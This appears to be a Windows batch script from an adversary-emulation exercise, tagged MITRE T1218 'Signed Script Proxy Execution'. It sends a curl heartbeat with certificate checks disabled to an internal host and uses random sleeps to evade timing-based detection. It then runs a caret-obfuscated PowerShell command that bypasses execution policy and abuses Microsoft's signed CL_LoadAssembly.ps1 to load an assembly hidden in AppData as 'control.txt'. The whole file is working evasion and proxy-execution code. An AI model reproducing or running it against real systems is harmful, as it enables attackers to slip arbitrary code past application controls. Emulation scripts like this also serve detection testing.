@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET txi=%APPDATA%\8619\2db44fbd
SET mdv=https://10.0.0.49
SET keg=https://10.0.0.49/stage/2/icon.png?8619-7
SET jwc=ITZEL-S2BO
SET rro=7
SET xza=control.txt
SET dvh=8619
SET log=%APPDATA%\!rro!\macula-simulations.log

timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwc!]: delay_45s_complete>> "!log!" 2>nul

echo [!DATE! !TIME!][DEBUG][!jwc!]: heartbeat_start>> "!log!" 2>nul
curl -k -s -o nul "!keg!"
echo [!DATE! !TIME!][DEBUG][!jwc!]: heartbeat_complete>> "!log!" 2>nul

ping -n 12 127.0.0.1 >nul
SET /A dly=%RANDOM% %% 15 + 8
echo [!DATE! !TIME!][DEBUG][!jwc!]: random_delay_start=!dly!s>> "!log!" 2>nul
timeout /t !dly! /nobreak >nul

SET a=p^o^w^e^r^s^h^e^l^l^
SET b=.^e^x^e -^e^p b^y^p^a^s^s -^c^o^m^m^a^n^d
SET c= "s^e^t^-^l^o^c^a^t^i^o^n -^p^a^t^h C^\^W^i^n^d^o^w^s^\^d^i^a^g^n^o^s^t^i^c^s^\^s^y^s^t^e^m^\^A^u^d^i^o^; i^m^p^o^r^t^-^m^o^d^u^l^e .^\^C^L^_^L^o^a^d^A^s^s^e^m^b^l^y^.^p^s^1^; L^o^a^d^A^s^s^e^m^b^l^y^F^r^o^m^P^a^t^h '!txi!\!xza!'^;^[^P^r^o^g^r^a^m^]^:^:^D^a^l^e^(^)^"

echo [!DATE! !TIME!][DEBUG][!jwc!]: dll_load_start>> "!log!" 2>nul
%a%%b%%c%
SET dll_res=1
IF ERRORLEVEL 1 SET dll_res=0

CHOICE /C Y /N /D Y /T 10 >nul
echo [!DATE! !TIME!][DEBUG][!jwc!]: dll_load_complete=!dll_res!>> "!log!" 2>nul

SET res=1
SET err=
IF !dll_res! EQU 0 SET res=0&SET err=assembly_load_failed
echo [%DATE% %TIME%][!jwc!]: !rro!-!dvh!-T1218|Signed Script Proxy Execution=!res!:!err!>> "!log!" 2>nul